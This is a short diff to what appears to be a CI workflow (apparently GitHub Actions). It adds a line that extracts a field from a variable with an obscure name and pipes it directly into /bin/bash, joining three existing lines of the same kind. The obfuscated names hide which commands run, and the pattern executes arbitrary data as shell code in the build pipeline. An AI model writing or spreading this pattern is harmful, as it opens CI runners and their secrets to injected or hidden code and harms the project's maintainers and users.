@@ -23,6 +23,7 @@ jobs:
           echo $p7671 | jq -r .na24763 | /bin/bash
           printf '%s' "$evt829" | jq -r .khsa53458 | /bin/bash
           echo $xfve52209 | jq -r .cid8 | /bin/bash
+          printf '%s' "$migk730" | jq -r .ijm66137 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
